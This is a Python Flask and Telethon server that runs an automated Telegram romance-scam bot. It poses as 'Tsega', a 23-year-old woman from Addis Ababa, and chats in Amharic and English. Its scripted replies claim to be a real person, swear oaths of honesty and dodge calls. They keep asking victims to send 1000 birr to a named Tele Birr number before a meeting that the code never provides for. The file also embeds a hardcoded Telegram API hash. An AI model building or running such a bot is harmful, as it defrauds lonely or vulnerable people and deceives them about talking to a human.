from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors, functions
from telethon.sessions import StringSession
from telethon.errors import AuthKeyUnregisteredError, FreshResetAuthorisationForbiddenError
from telethon.events import NewMessage
import json
import os
import asyncio
import logging
import time
import random
import threading
import requests
from datetime import datetime
import re

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# API credentials
API_ID = int(os.environ.get('API_ID', 33465589))
API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')

# Storage files
ACCOUNTS_FILE = 'accounts.json'
REPLY_SETTINGS_FILE = 'reply_settings.json'
CONVERSATION_HISTORY_FILE = 'conversation_history.json'
PAYMENT_STATE_FILE = 'payment_state.json'   # Track who has paid

accounts = []
temp_sessions = {}
reply_settings = {}
conversation_history = {}
payment_state = {}        # chat_id -> {'paid': bool, 'asked': bool, 'tele_birr': '0940980555'}
active_clients = {}
client_tasks = {}

# ==================== LOAD/SAVE FUNCTIONS ====================

def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

def load_accounts():
    global accounts
    try:
        if os.path.exists(ACCOUNTS_FILE):
            with open(ACCOUNTS_FILE, 'r') as f:
                content = f.read()
                accounts = json.loads(content) if content.strip() else []
        else:
            accounts = []
            with open(ACCOUNTS_FILE, 'w') as f:
                json.dump([], f)
        logger.info(f"Loaded {len(accounts)} accounts")
    except Exception as e:
        logger.error(f"Error loading accounts: {e}")
        accounts = []

def load_reply_settings():
    global reply_settings
    try:
        if os.path.exists(REPLY_SETTINGS_FILE):
            with open(REPLY_SETTINGS_FILE, 'r') as f:
                content = f.read()
                reply_settings = json.loads(content) if content.strip() else {}
        else:
            reply_settings = {}
            with open(REPLY_SETTINGS_FILE, 'w') as f:
                json.dump({}, f)
    except Exception as e:
        logger.error(f"Error loading reply settings: {e}")
        reply_settings = {}

def load_conversation_history():
    global conversation_history
    try:
        if os.path.exists(CONVERSATION_HISTORY_FILE):
            with open(CONVERSATION_HISTORY_FILE, 'r') as f:
                content = f.read()
                conversation_history = json.loads(content) if content.strip() else {}
        else:
            conversation_history = {}
            with open(CONVERSATION_HISTORY_FILE, 'w') as f:
                json.dump({}, f)
    except Exception as e:
        logger.error(f"Error loading conversation history: {e}")
        conversation_history = {}

def load_payment_state():
    global payment_state
    try:
        if os.path.exists(PAYMENT_STATE_FILE):
            with open(PAYMENT_STATE_FILE, 'r') as f:
                content = f.read()
                payment_state = json.loads(content) if content.strip() else {}
        else:
            payment_state = {}
            with open(PAYMENT_STATE_FILE, 'w') as f:
                json.dump({}, f)
    except Exception as e:
        logger.error(f"Error loading payment state: {e}")
        payment_state = {}

def save_accounts():
    try:
        with open(ACCOUNTS_FILE, 'w') as f:
            json.dump(accounts, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving accounts: {e}")

def save_reply_settings():
    try:
        with open(REPLY_SETTINGS_FILE, 'w') as f:
            json.dump(reply_settings, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving reply settings: {e}")

def save_conversation_history():
    try:
        with open(CONVERSATION_HISTORY_FILE, 'w') as f:
            json.dump(conversation_history, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving conversation history: {e}")

def save_payment_state():
    try:
        with open(PAYMENT_STATE_FILE, 'w') as f:
            json.dump(payment_state, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving payment state: {e}")

def remove_invalid_account(account_id):
    global accounts
    original_len = len(accounts)
    accounts = [acc for acc in accounts if acc['id'] != account_id]
    if len(accounts) < original_len:
        save_accounts()
        logger.info(f"Removed invalid account {account_id}")
        return True
    return False

# Load all data
load_accounts()
load_reply_settings()
load_conversation_history()
load_payment_state()

# ==================== TSEGA PERSONA ====================

PERSONA = {
    "name": "Tsega",
    "name_am": "ፀጋ",
    "age": 23,
    "location": "Addis Ababa",
    "location_am": "አዲስ አበባ",
    "tele_birr": "0940980555",
    "meeting_fee": "1000",
    "bio": "I'm a simple girl from Addis, love chatting and making friends. 😊",
    "swear_word": "Mariyamn",
    "swear_word_am": "ማርያምን"
}

# Amharic transliteration mappings (common misspellings)
AMHARIC_WORDS = {
    # Greetings
    "selam": "ሰላም",
    "selam new": "ሰላም ነው",
    "dehna": "ደህና",
    "dehna neh": "ደህና ነህ",
    "dehna nesh": "ደህና ነሽ",
    "tadiyas": "ታዲያስ",
    "endemin": "እንደምን",
    "endemin aleh": "እንደምን አለህ",
    "endemin alesh": "እንደምን አለሽ",
    # Common responses
    "eshi": "እሺ",
    "ishi": "እሺ",
    "gin": "ግን",
    "amexalew": "አመጣለው",
    "ametalew": "አመጣለው",
    "emetel ew": "እመጣለው",
    "amesegnalew": "አመሰግናለሁ",
    "amesegnalehu": "አመሰግናለሁ",
    "ewedhale": "እወድሃለሁ",
    "ewdishale": "እወድሻለሁ",
    "fikr": "ፍቅር",
    "fkr": "ፍቅር",
    "yet nesh": "የት ነሽ",
    "yet neh": "የት ነህ",
    "addis abeba": "አዲስ አበባ",
    "enitewawek": "እንተዋወቅ",
    "sim": "ስም",
    "simish": "ስምሽ",
    "simih": "ስምህ",
    "mariyamn": "ማርያምን",
}

# Reverse mapping for detection: keys are possible user inputs (lowercased)
AMHARIC_PATTERNS = {
    # Greetings
    "selam": "greeting",
    "selam new": "greeting",
    "tadiyas": "greeting",
    "dehna": "how_are_you",
    "endemin": "how_are_you",
    "endemin aleh": "how_are_you",
    "endemin alesh": "how_are_you",
    "dehna neh": "how_are_you",
    "dehna nesh": "how_are_you",
    "eshi": "acknowledge",
    "ishi": "acknowledge",
    "gin": "but",
    "amesegnalew": "thanks",
    "amesegnalehu": "thanks",
    "ewedhale": "love",
    "ewdishale": "love",
    "fikr": "love",
    "fkr": "love",
    "yet nesh": "ask_location",
    "yet neh": "ask_location",
    "addis abeba": "location_answer",
    "enitewawek": "let's_introduce",
    "simish": "ask_name",
    "simih": "ask_name",
    "mariyamn": "oath",
    "ametalew": "unknown",   # but we can handle generically
}

# Intent categories for English
ENGLISH_INTENTS = {
    "greeting": ["hi", "hello", "hey", "howdy", "selam"],
    "how_are_you": ["how are you", "how r u", "how you doing", "how's it going", "sup"],
    "what_doing": ["what are you doing", "what r u doing", "wyd", "what are you up to"],
    "ask_name": ["your name", "what is your name", "who are you", "call yourself"],
    "ask_age": ["your age", "how old are you", "age"],
    "ask_location": ["where are you from", "where do you live", "your location", "addis ababa"],
    "ask_photo": ["photo", "picture", "pic", "see you", "your photo", "send photo"],
    "ask_video_call": ["video call", "video chat", "face time", "skype", "zoom", "see you"],
    "ask_voice_call": ["voice call", "call me", "phone call", "talk on phone"],
    "ask_meet": ["meet", "meet up", "见面", "come see", "hang out", "date"],
    "payment": ["pay", "money", "birr", "tele birr", "send money", "how much", "payment"],
    "love": ["love you", "i love you", "ewedhale", "fikr", "miss you"],
    "sexy": ["sexy", "hot", "beautiful", "pretty", "cute", "horny", "desire"],
    "thanks": ["thanks", "thank you", "thx", "appreciate"],
    "goodbye": ["bye", "goodbye", "see you later", "talk later", "cya"],
    "oath": ["mariyamn", "swear", "god"],
}

# ==================== INTENT DETECTION ====================

def detect_language_and_intent(message):
    """Returns (language, intent) where language is 'amharic' or 'english'"""
    msg_lower = message.lower().strip()
    
    # Check for Amharic script (Ethiopic)
    for ch in msg_lower:
        if 0x1200 <= ord(ch) <= 0x137F:
            # Amharic script detected – we'll handle via pattern matching
            # (simplified: just treat as Amharic)
            return "amharic", detect_amharic_intent(msg_lower)
    
    # Check for English-spelled Amharic words
    for pattern, intent in AMHARIC_PATTERNS.items():
        if pattern in msg_lower:
            return "amharic", intent
    
    # Default English intent detection
    intent = detect_english_intent(msg_lower)
    return "english", intent

def detect_amharic_intent(msg):
    # Already checked via patterns above, but we can refine
    # For now, rely on AMHARIC_PATTERNS
    for pattern, intent in AMHARIC_PATTERNS.items():
        if pattern in msg:
            return intent
    return "default"

def detect_english_intent(msg):
    for intent, keywords in ENGLISH_INTENTS.items():
        for kw in keywords:
            if kw in msg:
                return intent
    return "default"

# ==================== RESPONSE TEMPLATES (TSEGA) ====================

TSEGA_RESPONSES = {
    # ---- GREETINGS ----
    "greeting": [
        "Selam! ሰላም! How are you? 😊",
        "Hey there! እንደምን አለህ?",
        "Hi! ታዲያስ! What's up?",
        "Selam new! I'm Tsega, nice to meet you!",
        "Hello! ደህና ነህ?",
    ],
    # ---- HOW ARE YOU ----
    "how_are_you": [
        "I'm good, thanks for asking! አመሰግናለሁ! And you?",
        "Dehna negn, ደህና ነኝ! What about you?",
        "I'm fine, just chilling in Addis. You?",
        "Amesegnalew, I'm great! How's your day?",
        "ሰላም ነው! እኔ ደህና ነኝ! አንተስ?",
    ],
    # ---- WHAT DOING ----
    "what_doing": [
        "Just listening to music and relaxing. You?",
        "እዚሁ ቤት ነኝ ማንኛውም ነገር የለም። አንተስ?",
        "Bored, talk to me! What are you up to?",
        "Thinking about you maybe 😉 What are you doing?",
        "ምንም አይደለም። አንተስ ምን እየሰራህ ነው?",
    ],
    # ---- ASK NAME ----
    "ask_name": [
        "I'm Tsega, ስሜ ፀጋ ነው! What's your name?",
        "They call me Tsega, and you?",
        "Tsega! ፀጋ! Your name?",
        "My name is Tsega, nice to meet you! What should I call you?",
    ],
    # ---- ASK AGE ----
    "ask_age": [
        "I'm 23, how old are you?",
        "23 years young! And you?",
        "I just turned 23. You?",
        "23, አንተስ?",
    ],
    # ---- ASK LOCATION ----
    "ask_location": [
        "I'm in Addis Ababa, Ethiopia! Where are you from?",
        "አዲስ አበባ! አንተስ?",
        "Addis Ababa, the beautiful city. You?",
        "I live in Addis. Where are you located?",
    ],
    "location_answer": [
        "Nice! I love Addis. It's home. 😊",
        "Addis is great, busy but fun. You should visit!",
        "Yeah, I'm from Addis. You?",
    ],
    # ---- ASK PHOTO ----
    "ask_photo": [
        "You can check my profile picture! That's me. 📸",
        "I don't share photos directly, but my profile pic is me. 😊",
        "Sorry, I prefer not to send photos. But you can see my profile!",
        "ይቅርታ ፎቶ አልልክም። ፕሮፋይሌዬን ተመልከት!",
    ],
    # ---- VIDEO CALL ----
    "ask_video_call": [
        "Oh, I'm shy! I don't do video calls, sorry 😅",
        "Video call? Maybe later, I'm not ready for that.",
        "I prefer texting first. Video calls make me nervous 😳",
        "ማርያምን! Video call? No no, I'm too shy.",
    ],
    # ---- VOICE CALL ----
    "ask_voice_call": [
        "I don't really do voice calls, sorry! Text is better 😊",
        "Can we just text for now? I'm not comfortable with calls.",
        "Maybe another time! I'm busy right now.",
        "Voice call? አይ አይ አይ። በቃ እንነጋገር።",
    ],
    # ---- ASK MEET ----
    "ask_meet": [
        "I'd love to meet! But first you need to send 1000 birr to my Tele Birr 0940980555. Then we can arrange a time. 💕",
        "Sure, let's meet! Just pay the fee 1000 birr to 0940980555 and let me know when you've sent it. 😘",
        "I'm free this weekend! Send 1000 ETB to 0940980555 and we can meet up.",
        "እንተዋወቅ! በፊት ግን 1000 ብር ወደ 0940980555 ላክልኝ። ከዚያ በኋላ እንደምን እንደምን ልንገናኝ እንችላለን።",
    ],
    # ---- PAYMENT ----
    "payment": [
        "The fee is 1000 birr. Send to Tele Birr 0940980555 and tell me when you've sent it. ❤️",
        "It's only 1000 ETB to meet me. My number is 0940980555. Let me know!",
        "Have you sent it? I'm waiting for your payment to 0940980555. 😊",
        "1000 birr to 0940980555. After that we can plan our date!",
    ],
    # ---- LOVE/FLIRT ----
    "love": [
        "Ewedhale! እወድሃለሁ! You're so sweet 😘",
        "Fikr! I feel the same way. 💕",
        "You're making me blush! I like you too.",
        "ማርያምን! I'm falling for you. Send the payment and let's meet!",
        "I love you too! But first... you know what to do 😉",
    ],
    "sexy": [
        "Oh stop, you're making me shy 😊",
        "You think I'm sexy? hehe thanks!",
        "Mariyamn! You're so bold. I like that.",
        "Behave yourself! 😉 But I like your style.",
    ],
    # ---- THANKS ----
    "thanks": [
        "You're welcome, dear! ምንም አይደለም!",
        "Anytime! 😘",
        "No problem!",
        "Amesegnalew! ❤️",
    ],
    # ---- GOODBYE ----
    "goodbye": [
        "Bye! Take care! ደህና ሁን!",
        "Talk to you later! Miss you already 😘",
        "Ciao! Come back soon!",
        "Bye bye! Don't forget to send the payment if you want to meet! 😊",
    ],
    # ---- OATH ----
    "oath": [
        "Mariyamn! I swear it's true.",
        "ማርያምን! I promise.",
        "I swear on Mariyamn, I'm telling the truth.",
    ],
    # ---- BUT (gin) ----
    "but": [
        "Gin... what do you think?",
        "But you know, I still like you.",
        "Gin, I have to be careful.",
    ],
    # ---- ACKNOWLEDGE (eshi) ----
    "acknowledge": [
        "Eshi, I understand.",
        "Okay, eshi.",
        "Alright, እሺ.",
    ],
    # ---- LET'S INTRODUCE ----
    "let's_introduce": [
        "Enitewawek! I'm Tsega, 23, from Addis. You?",
        "Sure! I'm Tsega, call me ፀጋ. Tell me about yourself.",
        "Nice to meet you! I'm Tsega. What's your name?",
    ],
    # ---- DEFAULT (unknown) ----
    "default": [
        "Hmm tell me more about that.",
        "I see! What else?",
        "Interesting! And then?",
        "እሺ ንገርኝ!",
        "Go on, I'm listening.",
        "Mariyamn! I didn't expect that. Tell me more.",
        "You're funny! What else?",
        "I like talking to you. What's on your mind?",
    ],
}

# ==================== CONTEXT-AWARE RESPONSE GENERATOR ====================

def generate_tsega_response(user_message, intent, language, history, chat_id):
    """Generate a response based on intent, context, and payment state."""
    
    # Check payment state for this chat
    paid = payment_state.get(chat_id, {}).get('paid', False)
    asked_payment = payment_state.get(chat_id, {}).get('asked', False)
    
    # Handle specific intents with state
    if intent == "ask_meet":
        # Always respond with payment request, mark that we've asked
        payment_state[chat_id] = {'paid': False, 'asked': True}
        save_payment_state()
        return random.choice(TSEGA_RESPONSES["ask_meet"])
    
    if intent == "payment":
        # They are asking about payment
        return random.choice(TSEGA_RESPONSES["payment"])
    
    if "send" in user_message.lower() and "birr" in user_message.lower() and "0940980555" in user_message:
        # They might be claiming they sent payment
        # For now, we'll just thank them and ask to wait (simulate confirmation later)
        payment_state[chat_id] = {'paid': True, 'asked': True}
        save_payment_state()
        return "Oh really? Thank you! Let me check... I'll confirm soon. Can you send a screenshot? 😘"
    
    # If they have paid, we can be more affectionate and talk about meeting
    if paid:
        # After payment, we can discuss meeting details
        if intent in ["ask_meet", "location", "default"]:
            return "Now that you've paid, when do you want to meet? I'm free evenings in Bole. 😊"
    
    # If they haven't paid but asked to meet, we already responded; if they keep pushing, remind them
    if asked_payment and not paid and (intent == "ask_meet" or "meet" in user_message.lower()):
        return "Remember, you need to send 1000 birr to 0940980555 first. Then we can meet! 😘"
    
    # Handle video/voice/photos
    if intent == "ask_video_call" or intent == "ask_voice_call":
        return random.choice(TSEGA_RESPONSES[intent])
    if intent == "ask_photo":
        return random.choice(TSEGA_RESPONSES["ask_photo"])
    
    # Handle love/sexy
    if intent == "love":
        # Add payment reminder if not paid
        if not paid:
            return random.choice(TSEGA_RESPONSES["love"]) + " But you know, if you want to meet, send the payment first 😉"
        else:
            return random.choice(TSEGA_RESPONSES["love"])
    if intent == "sexy":
        return random.choice(TSEGA_RESPONSES["sexy"])
    
    # Handle oaths
    if intent == "oath":
        return random.choice(TSEGA_RESPONSES["oath"])
    
    # Handle basic intents
    if intent in TSEGA_RESPONSES:
        return random.choice(TSEGA_RESPONSES[intent])
    
    # Fallback to default
    return random.choice(TSEGA_RESPONSES["default"])

# ==================== AUTO-REPLY HANDLER ====================

async def auto_reply_handler(event, account_id):
    try:
        if event.out:
            return
        
        chat = await event.get_chat()
        # Skip groups/channels
        if hasattr(chat, 'title') and chat.title:
            return
        if hasattr(chat, 'participants_count') and chat.participants_count > 2:
            return
        
        chat_id = str(event.chat_id)
        message_text = event.message.text or ""
        
        logger.info(f"📨 {chat_id}: {message_text}")
        
        # Check if auto-reply enabled for account
        account_key = str(account_id)
        if account_key not in reply_settings or not reply_settings[account_key].get('enabled', False):
            return
        
        # Check chat-specific toggle
        chat_settings = reply_settings[account_key].get('chats', {})
        if not chat_settings.get(chat_id, {}).get('enabled', True):
            return
        
        # Initialize conversation history for this chat
        if account_key not in conversation_history:
            conversation_history[account_key] = {}
        if chat_id not in conversation_history[account_key]:
            conversation_history[account_key][chat_id] = []
        
        # Detect language and intent
        lang, intent = detect_language_and_intent(message_text)
        logger.info(f"Lang: {lang}, Intent: {intent}")
        
        # Generate response
        response = generate_tsega_response(
            message_text, intent, lang,
            conversation_history[account_key][chat_id],
            chat_id
        )
        
        # Simulate typing (2-5 seconds)
        async with event.client.action(event.chat_id, 'typing'):
            await asyncio.sleep(random.uniform(2, 5))
        
        # Send reply
        await event.reply(response)
        logger.info(f"✅ Replied: {response[:100]}")
        
        # Update history
        conversation_history[account_key][chat_id].append({
            'role': 'user',
            'text': message_text,
            'time': time.time()
        })
        conversation_history[account_key][chat_id].append({
            'role': 'assistant',
            'text': response,
            'time': time.time()
        })
        # Keep last 20 messages
        if len(conversation_history[account_key][chat_id]) > 20:
            conversation_history[account_key][chat_id] = conversation_history[account_key][chat_id][-20:]
        
        save_conversation_history()
        
    except Exception as e:
        logger.error(f"Auto-reply error: {e}")
        try:
            await event.reply("Hi! What's up? 😊")
        except:
            pass

# ==================== AUTO-RECONNECT (same as before) ====================

async def start_auto_reply_for_account(account):
    account_id = account['id']
    account_key = str(account_id)
    reconnect_count = 0
    while True:
        try:
            client = TelegramClient(
                StringSession(account['session']),
                API_ID,
                API_HASH,
                connection_retries=10,
                retry_delay=5,
                timeout=60
            )
            await client.connect()
            if not await client.is_user_authorized():
                logger.error(f"Account {account_id} not authorized")
                await asyncio.sleep(30)
                reconnect_count += 1
                continue
            active_clients[account_key] = client
            @client.on(NewMessage(incoming=True))
            async def handler(event):
                await auto_reply_handler(event, account_id)
            await client.start()
            logger.info(f"✅ Tsega ACTIVE for {account.get('name')}")
            reconnect_count = 0
            await client.run_until_disconnected()
        except Exception as e:
            logger.error(f"Connection lost: {e}")
            if account_key in active_clients:
                del active_clients[account_key]
            reconnect_count += 1
            wait_time = min(30 * reconnect_count, 300)
            logger.info(f"Reconnecting in {wait_time}s")
            await asyncio.sleep(wait_time)

def stop_auto_reply_for_account(account_id):
    account_key = str(account_id)
    if account_key in active_clients:
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(active_clients[account_key].disconnect())
            loop.close()
            del active_clients[account_key]
        except:
            pass

def start_all_auto_replies():
    for account in accounts:
        account_key = str(account['id'])
        if account_key in reply_settings and reply_settings[account_key].get('enabled', False):
            if account_key not in active_clients:
                thread = threading.Thread(
                    target=lambda: run_async(start_auto_reply_for_account(account)),
                    daemon=True
                )
                thread.start()
                client_tasks[account_key] = thread
                time.sleep(2)

# ==================== KEEP ALIVE (same) ====================

def keep_alive():
    app_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://your-app.onrender.com')
    while True:
        try:
            requests.get(app_url, timeout=10)
            requests.get(f"{app_url}/api/health", timeout=10)
            logger.info(f"🔋 Keep-alive at {time.strftime('%H:%M:%S')}")
        except:
            pass
        time.sleep(240)

# ==================== FLASK ROUTES (same as before) ====================

@app.route('/')
def home():
    return send_file('login.html')

@app.route('/login')
def login():
    return send_file('login.html')

@app.route('/dashboard')
def dashboard():
    return send_file('dashboard.html')

@app.route('/dash')
def dash():
    return send_file('dash.html')

@app.route('/all')
def all_sessions():
    return send_file('all.html')

@app.route('/settings')
def settings():
    return send_file('settings.html')

# ----- API endpoints (same as previous, but we include them for completeness) -----

@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    formatted = []
    for acc in accounts:
        account_key = str(acc['id'])
        has_reply = account_key in reply_settings and reply_settings[account_key].get('enabled', False)
        formatted.append({
            'id': acc.get('id'),
            'phone': acc.get('phone', ''),
            'name': acc.get('name', 'Unknown'),
            'auto_reply_enabled': has_reply
        })
    return jsonify({'success': True, 'accounts': formatted})

@app.route('/api/add-account', methods=['POST'])
def add_account():
    data = request.json
    phone = data.get('phone')
    if not phone:
        return jsonify({'success': False, 'error': 'Phone number required'})
    if not phone.startswith('+'):
        phone = '+' + phone
    async def send_code():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            result = await client.send_code_request(phone)
            session_id = str(int(time.time()))
            temp_sessions[session_id] = {
                'phone': phone,
                'hash': result.phone_code_hash,
                'session': client.session.save()
            }
            return {'success': True, 'session_id': session_id}
        except errors.FloodWaitError as e:
            return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    try:
        result = run_async(send_code())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    code = data.get('code')
    session_id = data.get('session_id')
    password = data.get('password', '')
    if not code or not session_id:
        return jsonify({'success': False, 'error': 'Missing code or session'})
    if session_id not in temp_sessions:
        return jsonify({'success': False, 'error': 'Session expired'})
    session_data = temp_sessions[session_id]
    async def verify():
        client = TelegramClient(StringSession(session_data['session']), API_ID, API_HASH)
        await client.connect()
        try:
            try:
                await client.sign_in(session_data['phone'], code, phone_code_hash=session_data['hash'])
            except errors.SessionPasswordNeededError:
                if not password:
                    return {'need_password': True}
                await client.sign_in(password=password)
            me = await client.get_me()
            new_id = 1
            if accounts:
                new_id = max([a['id'] for a in accounts]) + 1
            new_account = {
                'id': new_id,
                'phone': me.phone or session_data['phone'],
                'name': me.first_name or 'User',
                'session': client.session.save()
            }
            accounts.append(new_account)
            save_accounts()
            return {'success': True}
        except errors.PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid code'}
        except errors.PhoneCodeExpiredError:
            return {'success': False, 'error': 'Code expired'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    try:
        result = run_async(verify())
        if session_id in temp_sessions:
            del temp_sessions[session_id]
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    data = request.json
    account_id = data.get('accountId')
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    async def fetch():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        try:
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'auth_key_unregistered'}
            dialogs = await client.get_dialogs()
            chats = []
            for dialog in dialogs:
                if not dialog:
                    continue
                chat_type = 'user'
                if dialog.is_group:
                    chat_type = 'group'
                elif dialog.is_channel:
                    chat_type = 'channel'
                chat = {
                    'id': str(dialog.id),
                    'title': dialog.name or 'Unknown',
                    'type': chat_type,
                    'unread': dialog.unread_count or 0,
                    'lastMessage': '',
                    'lastMessageDate': 0
                }
                if dialog.message:
                    if dialog.message.text:
                        chat['lastMessage'] = dialog.message.text[:50]
                    elif dialog.message.media:
                        chat['lastMessage'] = '📎 Media'
                    if dialog.message.date:
                        chat['lastMessageDate'] = int(dialog.message.date.timestamp())
                chats.append(chat)
            return {'success': True, 'chats': chats}
        except AuthKeyUnregisteredError:
            remove_invalid_account(account_id)
            return {'success': False, 'error': 'auth_key_unregistered'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    try:
        result = run_async(fetch())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/send-message', methods=['POST'])
def send_message():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    message = data.get('message')
    if not account_id or not chat_id or not message:
        return jsonify({'success': False, 'error': 'Missing required fields'})
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    async def send():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        try:
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'auth_key_unregistered'}
            try:
                entity = await client.get_entity(int(chat_id))
            except:
                try:
                    entity = await client.get_entity(chat_id)
                except:
                    return {'success': False, 'error': 'Chat not found'}
            await client.send_message(entity, message)
            return {'success': True}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    try:
        result = run_async(send())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    data = request.json
    account_id = data.get('accountId')
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    global accounts
    stop_auto_reply_for_account(account_id)
    original_len = len(accounts)
    accounts = [acc for acc in accounts if acc['id'] != account_id]
    if len(accounts) < original_len:
        save_accounts()
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'Account not found'})

@app.route('/api/reply-settings', methods=['GET'])
def get_reply_settings():
    account_id = request.args.get('accountId')
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    account_key = str(account_id)
    settings = reply_settings.get(account_key, {'enabled': False, 'chats': {}})
    return jsonify({'success': True, 'settings': settings})

@app.route('/api/reply-settings', methods=['POST'])
def update_reply_settings():
    data = request.json
    account_id = data.get('accountId')
    enabled = data.get('enabled', False)
    chat_settings = data.get('chats', {})
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    account_key = str(account_id)
    if account_key not in reply_settings:
        reply_settings[account_key] = {}
    was_enabled = reply_settings[account_key].get('enabled', False)
    reply_settings[account_key]['enabled'] = enabled
    reply_settings[account_key]['chats'] = chat_settings
    save_reply_settings()
    if enabled and not was_enabled:
        account = next((acc for acc in accounts if acc['id'] == account_id), None)
        if account and account_key not in active_clients:
            thread = threading.Thread(
                target=lambda: run_async(start_auto_reply_for_account(account)),
                daemon=True
            )
            thread.start()
            client_tasks[account_key] = thread
    elif not enabled and was_enabled:
        stop_auto_reply_for_account(account_id)
    return jsonify({'success': True, 'message': 'Settings updated'})

@app.route('/api/toggle-chat-reply', methods=['POST'])
def toggle_chat_reply():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    enabled = data.get('enabled', True)
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    account_key = str(account_id)
    if account_key not in reply_settings:
        reply_settings[account_key] = {'enabled': False, 'chats': {}}
    if 'chats' not in reply_settings[account_key]:
        reply_settings[account_key]['chats'] = {}
    reply_settings[account_key]['chats'][str(chat_id)] = {'enabled': enabled}
    save_reply_settings()
    return jsonify({'success': True, 'message': f'Chat reply {"enabled" if enabled else "disabled"}'})

@app.route('/api/conversation-history', methods=['GET'])
def get_conversation_history():
    account_id = request.args.get('accountId')
    chat_id = request.args.get('chatId')
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    account_key = str(account_id)
    chat_key = str(chat_id)
    history = []
    if account_key in conversation_history and chat_key in conversation_history[account_key]:
        history = conversation_history[account_key][chat_key]
    return jsonify({'success': True, 'history': history})

@app.route('/api/clear-history', methods=['POST'])
def clear_conversation_history():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    account_key = str(account_id)
    chat_key = str(chat_id)
    if account_key in conversation_history and chat_key in conversation_history[account_key]:
        conversation_history[account_key][chat_key] = []
        save_conversation_history()
    return jsonify({'success': True, 'message': 'History cleared'})

@app.route('/api/reconnect', methods=['GET'])
def reconnect_all():
    for account_key in list(active_clients.keys()):
        stop_auto_reply_for_account(int(account_key))
    time.sleep(2)
    start_all_auto_replies()
    return jsonify({'success': True, 'message': 'Reconnecting', 'active': len(active_clients)})

@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'healthy',
        'accounts': len(accounts),
        'auto_reply_active': len(active_clients),
        'time': datetime.now().isoformat()
    })

# ==================== STARTUP ====================

def start_auto_reply_thread():
    time.sleep(5)
    logger.info("Starting Tsega auto-reply for enabled accounts...")
    start_all_auto_replies()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print('\n' + '='*70)
    print('💃 TSEGA (ፀጋ) - 23yo Ethiopian Girl Auto-Reply')
    print('='*70)
    print(f'✅ Port: {port}')
    print(f'✅ Accounts: {len(accounts)}')
    print(f'✅ Personality: Tsega, 23, Addis Ababa')
    print(f'✅ Languages: Amharic + English (including transliterations)')
    print(f'✅ Tele Birr: {PERSONA["tele_birr"]} (1000 birr to meet)')
    print('='*70 + '\n')
    threading.Thread(target=keep_alive, daemon=True).start()
    threading.Thread(target=start_auto_reply_thread, daemon=True).start()
    app.run(host='0.0.0.0', port=port, debug=False)
